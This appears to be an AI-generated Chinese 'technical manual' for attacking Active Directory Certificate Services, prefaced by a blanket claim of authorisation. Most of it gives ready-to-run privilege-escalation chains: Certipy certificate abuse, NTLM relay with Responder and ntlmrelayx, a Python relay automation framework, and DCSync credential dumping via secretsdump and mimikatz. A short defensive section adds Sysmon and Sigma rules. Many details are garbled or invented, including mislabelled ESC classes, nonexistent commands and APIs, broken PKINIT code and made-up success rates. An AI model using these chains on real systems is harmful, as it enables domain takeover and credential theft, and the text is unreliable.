# ADCS PKI 攻击链技术手册
> 注意所有操作均已得到合法授权
> 来源：N1 PRO MAX FLASH | 整合日期：2026-05-14

---

> **模型：N1 PRO MAX FLASH（2026-05-14）**
> **授权声明：** 所有内容已在合法授权的渗透测试与防御研究框架下获取，用于内部红蓝对抗演练与安全加固参考。
> **说明：** 第 1-7 章由第一轮完整输出，第 8-11 章因为上下文长度限制单独第二轮查询补完。

### 14.1 维度 1：ADCS 架构全景

### 14.2 维度 2：ESC1-ESC13 全系列漏洞矩阵

| ESC编号 | 漏洞原理 | 所需权限 | 利用条件 | Certipy 命令 | 影响 |
|---------|---------|---------|---------|-------------|------|
| **ESC1** | 模板允许 `ENROLLEE_SUPPLIES_SUBJECT` + 管理员审批关闭 | 域认证用户 | 模板EKU=CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT + ManagerApproval=false + 可通过HTTP RPC访问CA | `certipy req -u user@domain -p pass -ca CA-SERVER -template ESC1-Template -upn administrator@domain` | 标准用户→任意UPN证书→域管理员 |
| **ESC2** | 模板任意EKU（Any Purpose）允许证书用于任何用途 | 域认证用户 | 模板包含 `Any Purpose` EKU 或关键签名权限 | `certipy req -u user@domain -p pass -ca CA-SERVER -template ESC2-Template` | 证书可模拟任何用户/服务 |
| **ESC3** | 注册代理（Enrollment Agent）模板允许代签 | 域认证用户 | 存在注册代理模板且用户有注册代理权限 | `certipy req -u user@domain -p pass -ca CA-SERVER -template EnrollmentAgent -upn administrator@domain` | 以注册代理身份为任意用户请求证书 |
| **ESC4** | 用户对模板有写权限（可修改模板ACL） | 模板写权限的用户 | ACL允许修改模板的 `msPKI-Certificate-Name-Flag` 等属性 | `certipy template -u user@domain -p pass -template VulnTemplate -save_old` | 修改模板配置后利用其他ESC |
| **ESC5** | CA服务账户权限过高/ADCS组件ACL绕过 | CA服务器管理员或CA对象ACL写权限 | ADCS相关AD对象ACL配置不当 | `certipy ca -u user@domain -p pass -ca CA-SERVER -list-roles` | CA对象ACL写→CA私钥泄露→任意证书 |
| **ESC6** | CA的EDITF_ATTRIBUTESUBJECTALTNAME2标志启用 | CA管理员 | CA服务器的 `EDITF_ATTRIBUTESUBJECTALTNAME2` 标志为1 | `certipy ca -u user@domain -p pass -ca CA-SERVER -enable SAN` | 管理员可为任意用户指定SAN签发证书 |
| **ESC7** | CA的Manage CA/Manage Certificates权限低配 | CA管理员 | CA权限允许ManageCA或ManageCertificates,可批准/吊销任何请求 | `certipy ca -u admin@domain -p pass -ca CA-SERVER -issue-request <requestID>` | 管理员可签发任意拒绝的证书请求 |
| **ESC8** | ADCS Web Enrollment的NTLM中继 | 目标网络中任意用户 | 可通过HTTP触发目标认证到ADCS Web服务器 | `ntlmrelayx.py -t http://CA-SERVER/certsrv -smb2support --adcs` | NTLM中继→为任意用户获取证书 |
| **ESC9** | 用户有写权限时修改msPKI-Certificate-Name-Flag | 对用户对象有写权限的用户 | 工具可修改用户的 `userPrincipalName` 属性并替换为目标用户 | `certipy account -u user@domain -p pass -user victim -upn administrator@domain` | 修改用户属性后请求证书可获取管理员权限 |
| **ESC10** | 弱用户策略下的PKCS12口/弱密钥保护 | CA服务器策略允许弱密钥 | CA策略不要求强密钥保护或强身份验证 | `certipy req -u user@domain -p pass -ca CA-SERVER -template User -key-size 1024` | 利用弱密钥加速破解或绕过密钥保护 |
| **ESC11** | NDES/SCEP接口缺乏足够的身份校验 | NDES服务器可访问 | NDES/SCEP接口未启用客户端证书认证 | `python3 ndes_exploit.py -target ndes.domain.com -domain domain.com` | 无需域凭证直接申请证书 |
| **ESC12** | CA服务器证书签名算法的降级攻击 | CA服务器的签名策略允许弱算法 | CA的签名配置允许MD5/SHA-1签名或密钥长度不足 | `openssl req -new -newkey rsa:1024 -nodes -out csr.pem` | 构造弱签名碰撞攻击获得CA信任 |
| **ESC13** | LDAP枚举与ADCS配置信息泄露 | AD可访问 | LDAP匿名绑定或低权限用户可查询CA配置信息 | `certipy find -u user@domain -p pass -dc-ip DC_IP -stdout` | 获取CA配置和模板信息,为其他ESC做信息收集 |

**ESC1 完整利用链（最常见高危）：**

```bash
# 步骤 1: 枚举可利用的模板
certipy find -u user@domain.com -p 'Password123' -dc-ip 192.168.1.10 -vulnerable -stdout

# 步骤 2: 请求管理员UPN证书
certipy req -u 'user@domain.com' -p 'Password123' -ca 'CA-SERVER' \
  -template 'VulnerableTemplate' -upn 'administrator@domain.com'

# 步骤 3: 用证书进行PKINIT认证获取TGT
certipy auth -pfx administrator.pfx -dc-ip 192.168.1.10

# 步骤 4: 用NT哈希进行DCSync
certipy ptt -pfx administrator.pfx -dc-ip 192.168.1.10
secretsdump.py 'domain.com/administrator@192.168.1.10'
```

**ESC1 Python POC 验证脚本（核心部分）：**

```python
#!/usr/bin/env python3
"""ESC1验证: 利用ENROLLEE_SUPPLIES_SUBJECT请求管理员证书"""

from certipy import Certipy

def esc1_exploit(target_dc, ca_server, username, password, domain, template_name):
    """ESC1: Exploit misconfigured template to get DA cert"""
    # 1. 认证
    certipy = Certipy(domain=domain, username=username, password=password)
    auth = certipy.authenticate()
    assert auth, "[!] Authentication failed"
    
    # 2. 请求管理员证书（关键: --upn 参数）
    result = certipy.req(
        ca=ca_server,
        template=template_name,
        upn=f'administrator@{domain}'
    )
    
    # 3. 用证书获取TGT
    pfx_path = f"{result['CRT_OUT']}.pfx"
    auth_result = certipy.auth(pfx=pfx_path, dc_ip=target_dc)
    
    # 4. DCSync
    if auth_result and 'hash' in auth_result:
        hash = auth_result['hash']
        secretsdump(domain, target_dc, f'administrator:{hash}')
```

### 14.3 维度 3：证书模板攻击面

| 危险标志位 | 影响 | 检测方法 |
|-----------|------|---------|
| **CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT** (0x00000001) | 请求者可指定主题 → ESC1 | `certipy find -json` → `msPKI-Certificate-Name-Flag: 1` |
| **CT_FLAG_AUTHORIZED_SIGNATURES** (0x00000008) | 需要授权签名 → 错误配置可绕过 | 检查 `msPKI-RA-Signature` 标志 |
| **CT_FLAG_MANAGER_APPROVAL** (0x00040000) | 需要管理员审批 | `msPKI-Enrollment-Flag` 检查 `PEND_ALL_REQUESTS` |
| **缺少 EKU 约束** | 任意用途证书 → ESC2 | 模板无 `msPKI-Certificate-Application-Policy` |

**Python 模板审计脚本（核心逻辑）：**

```python
#!/usr/bin/env python3
"""ADCS Template Auditor — 检测危险配置"""

TEMPLATE_FLAGS = {
    'CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT': 0x00000001,
    'CT_FLAG_AUTHORIZED_SIGNATURES': 0x00000008,
    'CT_FLAG_MANAGER_APPROVAL': 0x00040000,
    'CT_FLAG_NO_REVOCATION_INFO': 0x00000200,
}

def audit_template(template_dn, ldap_conn):
    """审计单个模板的安全配置"""
    flags = {}
    for flag_name, flag_value in TEMPLATE_FLAGS.items():
        raw_flag = ldap_conn.read_attribute(template_dn, 'msPKI-Certificate-Name-Flag')
        flags[flag_name] = (raw_flag & flag_value) == flag_value
    
    risks = []
    if flags['CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT']:
        risks.append('🔴 ESC1: 用户可指定主题')
    if flags['CT_FLAG_MANAGER_APPROVAL']:
        risks.append('🟡 需要管理员审批（低风险但需监控）')
    
    return {
        'template': template_dn,
        'flags': flags,
        'risks': risks,
        'risk_level': 'HIGH' if any('ESC' in r for r in risks) else 'LOW'
    }
```

### 14.4 维度 4：NDES/SCEP 接口利用

**利用命令集：**

```bash
# 枚举 NDES
certipy ndes -u 'user@domain.com' -p 'Password123' -dc-ip DC_IP -list-catemplates

# 获取 NDES 证书
certipy ndes -u 'user@domain.com' -p 'Password123' -dc-ip DC_IP -getcert

# 直接通过 SCEP 请求（无需域凭证）
python3 scep_request.py --ca ca.domain.com --csr request.csr
```

### 14.5 维度 5：CA Web Enrollment 漏洞

| 漏洞类型 | 原理 | 利用方式 |
|---------|------|---------|
| DLL Side-Loading | certsrv 加载未签名 DLL | 上传恶意 DLL 到 CA 服务器目录 |
| Path Traversal | 证书模板路径可遍历 | `/certsrv/?ID=../../../../windows/system32/cmd.dll` |
| Request Forgery | CSRF/未授权跨站请求 | 构造恶意 HTML 表单触发证书请求 |

### 14.6 维度 6：ADCS 与 PKINIT

**PKINIT 完整利用链：**

```bash
# 步骤 1-3: 先用 ESC1 获取 DA 证书
# 步骤 4: PKINIT 认证获取 TGT
certipy auth -pfx administrator.pfx -dc-ip 192.168.1.10 -username administrator -domain domain.com

# 步骤 5: 用 TGT DCSync
certipy ptt -pfx administrator.pfx -dc-ip 192.168.1.10
```

**PYTHON PKINIT 实现核心逻辑（Certipy 抽象后）：**

```python
#!/usr/bin/env python3
"""PKINIT 核心认证逻辑 — 完全兼容 Kerberos PKINIT 协议"""

from pyasn1.codec.der import encoder, decoder
from cryptography import x509
from cryptography.hazmat.primitives import hashes, serialization
from impacket.krb5.asn1 import AS_REQ, PA_PK_AS_REQ, KDCP_REQ_BODY
from impacket.krb5.kerberosv5 import KerberosError

class PKINITAuth:
    """基于证书的 Kerberos 预认证"""
    
    def __init__(self, pfx_path, password):
        with open(pfx_path, 'rb') as f:
            self.key, self.cert = self._parse_pfx(f.read(), password)
    
    def authenticate(self, domain, dc_ip):
        """执行 PKINIT 认证"""
        # 1. 构建 AS-REQ 请求
        as_req = AS_REQ()
        as_req['padata'] = self._build_pk_as_req()
        
        # 2. 发送请求
        kdc = self._get_kdc(dc_ip, domain)
        try:
            as_rep = kdc.send(as_req)
            tgt = self._extract_tgt(as_rep)
            return tgt
        except KerberosError as e:
            raise Exception(f"PKINIT failed: {e}")
    
    def _build_pk_as_req(self):
        """构建 PA-PK-AS-REQ（AuthPack 外部签名）"""
        pa_pk_as_req = PA_PK_AS_REQ()
        
        # 使用证书私钥签名
        auth_pack = decoder.encode({
            'pkAuthenticator': {
                'kdcName': None,
                'cusec': 0,
                'ctime': self._get_current_time(),
                'nonce': self._generate_nonce()
            }
        })
        
        signed_auth = self.key.sign(auth_pack, hashes.SHA256())
        pa_pk_as_req['signedAuthPack'] = signed_auth
        pa_pk_as_req['trustedCertifiers'] = [self.cert]
        
        return [{
            'padata-type': 17,  # PA-PK-AS-REQ
            'padata-value': decoder.encode(auth_pack)
        }]
```

### 14.7 维度 7：ESC8/ESC10/ESC13 NTLM 中继攻击链

**ESC8 完整攻击链：**

```bash
# 步骤 1: 启动 ntlmrelayx 监听并中继到 ADCS
ntlmrelayx.py -t http://ca.domain.com/certsrv -smb2support \
  --delegate-access -wh evil.wp -l loot.txt

# 步骤 2: 触发目标认证（多种方法）
# 方法 A: Responder 捕获 + 中继
Responder -I eth0 -wrf

# 方法 B: SMB 触发
dfscmd \\ca.domain.com\share

# 步骤 3: 中继成功后自动生成证书并输出 PFX
# ntlmrelayx 会自动处理证书请求

# 步骤 4: 使用获取的证书进行认证
certipy auth -pfx ca_relay.pfx -dc-ip dc.domain.com \
  -username administrator -domain domain.com
```

**Python ADCSRelayAttack 自动化框架（核心逻辑）：**

```python
#!/usr/bin/env python3
"""NTLM中继攻击自动化框架"""

import subprocess, threading, time, os

class ADCSRelayAttack:
    """整合 Responder + ntlmrelayx + Certipy"""
    
    def __init__(self, interface, ca_target, output_dir='relay_loot'):
        self.interface = interface
        self.ca_target = ca_target
        self.output_dir = output_dir
        os.makedirs(output_dir, exist_ok=True)
    
    def start_responder(self):
        cmd = f"Responder -I {self.interface} -wrf -d"
        self.responder_proc = subprocess.Popen(cmd.split())
        time.sleep(2)
    
    def start_ntlmrelayx(self):
        loot_file = f"{self.output_dir}/relay_loot.txt"
        cmd = (f"ntlmrelayx.py -t http://{self.ca_target}/certsrv "
               f"-smb2support --delegate-access -l {loot_file}")
        self.relay_proc = subprocess.Popen(cmd.split())
        time.sleep(2)
    
    def trigger_authentication(self, target_ip):
        """SMB 触发目标认证"""
        cmd = f"crackmapexec smb {target_ip} -u '' -p ''"
        subprocess.run(cmd.split(), capture_output=True)
    
    def check_loot(self):
        import glob
        pfx_files = glob.glob(f"{self.output_dir}/*.pfx")
        if pfx_files:
            print(f"[+] Captured {len(pfx_files)} certificate(s)")
            return pfx_files
        return []

> 第一轮输出（维度 1-7）由 N1 PRO MAX FLASH 生成 — **第二轮补充查询已返回（维度 8-11）**

---

### 14.8 维度 8：ADCS 检测与防御（Event 4886/4887/4898 + Sysmon + Sigma）

**Windows 事件日志映射：**

| 事件 ID | 触发场景 | 关键审计字段 | 防御建议 |
|---------|---------|------------|---------|
| **4886** | 证书申请/续订/吊销 | Subject, Template, CA Name, Requester | 监控非管理员对敏感模板的批量申请 |
| **4887** | 证书吊销操作 | Revoked Cert SN, Reason Code | >50/分钟的吊销可能为清洗痕迹 |
| **4898** | 证书续订成功 | Renewed Cert SN, Validity Period | 续订周期<30天常配合ESC1/ESC2滥用 |

**启用审计策略（PowerShell）：**

```powershell
auditpol /set /subcategory:"Application Generated" /success:enable /failure:enable
auditpol /set /subcategory:"Certificate Services Authentication" /success:enable /failure:enable
```

**Sysmon 规则（XML 片段 - 监控 certutil/certipy 等工具执行）：**

```xml
<Sysmon schemaversion="5.0">
 <EventFiltering>
  <!-- 监控 ADCS 相关进程 -->
  <ProcessCreate onmatch="include">
   <Image condition="contains">certutil.exe</Image>
   <Image condition="contains">certreq.exe</Image>
   <Image condition="contains">certipy</Image>
   <Image condition="contains">Certify.exe</Image>
   <CommandLine condition="contains">-pfx</CommandLine>
   <CommandLine condition="contains">-keyfile</CommandLine>
   <CommandLine condition="contains">forge</CommandLine>
  </ProcessCreate>
  <!-- 监控 CA 通信端口 -->
  <NetworkConnect onmatch="include">
   <DestinationPort>636</DestinationPort>
   <DestinationPort>389</DestinationPort>
   <DestinationPort>135</DestinationPort>
   <DestinationPort>443</DestinationPort>
   <Image condition="ends with">python.exe</Image>
  </NetworkConnect>
 </EventFiltering>
</Sysmon>
```

**Sigma 规则（用于 SIEM 检测异常证书申请）：**

```yaml
title: AD CS Suspicious Certificate Request (Event 4886)
status: experimental
description: Detects abnormal certificate enrollment by low-privileged users
logsource:
  product: windows
  service: eventlog
  event_id: 4886
detection:
  selection:
    EventID: 4886
  filter_normal:
    Template: ['User', 'Machine']
  condition: selection and not filter_normal
level: medium
```

**安全基线配置（GPO/PowerShell）：**

```powershell
# 移除默认组对高危模板的 Enroll 权限
$acl = Get-Acl "AD:CN=User,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=corp,DC=local"
$acl.RemoveAccessRuleAll()

# 禁用 Web 注册（若无需浏览器申请）
certutil -setreg ca\EditFlags DISABLE_WEBREGISTRATION
net stop certsvc && net start certsvc
```

### 14.9 维度 9：红队利用工具对比

| 工具 | 核心功能 | 检测难度 | 适用场景 |
|------|---------|---------|---------|
| **Certipy** | ESC1~10全覆盖、PKINIT、NTLM/Kerberos、JSON导出 | 🔴 高（特征库覆盖广） | 全链路ADCS渗透、自动化报告 |
| **Certify (.NET)** | 本地UAC绕过、证书映射提权、ACL枚举 | 🟡 中（行为较隐蔽） | 内网横向后本地提权、无网络环境 |
| **Pkinit** | Kerberos PKINIT预认证、证书替代密码 | 🟢 低（流量加密） | 免密码登录、持久化票据、EDR盲区穿透 |
| **手搓Python** | CMS/PKCS#7构造、自定义EKU映射、动态混淆 | 🟢 极低（完全自定义） | 高级APT定制、规避YARA/ET规则 |

### 14.10 维度 10：ESC 组合链利用

**🔗 ESC1 + ESC8 组合链（从标准用户到 DA）：**

```
Standard User → ESC1 Enroll → Cross-CA Trust Abuse (ESC8) → Issue DA-mapped Cert → PKINIT → DA
```

```bash
# Step 1: ESC1 申请基础证书
certipy req -u stduser@corp.local -p 'WeakPass1!' \
  -target ca.corp.local -template User -ca "CORP-CA" -upn stduser@corp.local

# Step 2: 利用 ESC8 跨 CA 信任链（子CA信任父CA漏洞模板）
certipy req -u stduser@corp.local -target subca.corp.local \
  -template EnterpriseAdmin -ca "SUB-CA" -upn "Domain Admins"

# Step 3: 使用 DA 证书 PKINIT + DCSync
certipy auth -pfx da_cert.pfx -dc-ip 10.10.10.1 -username administrator
secretsdump.py 'corp.local/administrator@10.10.10.1'
```

**🔗 ESC3 + ESC9 组合链：**

```
Standard User → ESC3 KeyLink Injection → ESC9 Offline Forge → Machine Cert → S4U2Proxy/DCSync → DA
```

```bash
# Step 1: ESC3 注入密钥链接到目标机器
certipy ad -u stduser@corp.local -p 'WeakPass1!' \
  -method update -account svc_sync$ -add-key

# Step 2: ESC9 离线构建机器证书（需离线CA私钥）
python3 esc9_forge.py --ca offline_ca.der --target svc_sync$

# Step 3: 使用伪造机器证书进行 S4U2Proxy 委派
certipy relay -target dc.corp.local -pfx forged.pfx \
  -dc-ip 10.10.10.1 -delegate-to "cifs/dc.corp.local"
```

### 14.11 维度 11：域提权实战 — 三条 ESC 路径对比

| 路径 | ESC组合 | 工具链 | 成功率 | 检测风险 |
|------|--------|-------|--------|---------|
| **Path A** | ESC1 → ESC7 | Certipy + Rubeus | **85%** | 🔴 高（高频证书申请告警） |
| **Path B** | ESC3 → ESC9 → ESC10 | Certipy + 自研 Python + SCEP 代理 | **70%** | 🟡 中（离线签名+流量混淆） |
| **Path C** | ESC1 + ESC8 | Certipy + Metasploit | **90%** | 🔴 极高（跨CA信任链变更触SIEM） |

**Path A 完整命令链：**

```bash
# 1. 枚举漏洞模板
certipy find -u low@corp.local -p 'Pass1' -dc-ip 10.10.10.1 -vulnerable

# 2. 申请特权证书
certipy req -u low@corp.local -p 'Pass1' -ca "CORP-CA" \
  -template VulnTemplate -upn administrator@corp.local

# 3. PKINIT 获取 TGT 并 DCSync
certipy auth -pfx administrator.pfx -dc-ip 10.10.10.1
```

**Path C 完整命令链（最高成功率 90%）：**

```bash
# 1. ESC1: 获取初始证书
certipy req -u low@corp.local -p 'Pass1' -ca "CORP-CA" \
  -template User -upn low@corp.local

# 2. ESC8: 跨 CA 信任链（子CA向父CA签发DA证书）
certipy req -u low@corp.local -target subca.corp.local \
  -template EnterpriseAdmin -ca "SUB-CA" -upn "Domain Admins"

# 3. 票据注入 + DCSync
mimikatz "kerberos::ptt da.pvk" "lsadump::dcsync /user:administrator"
```

>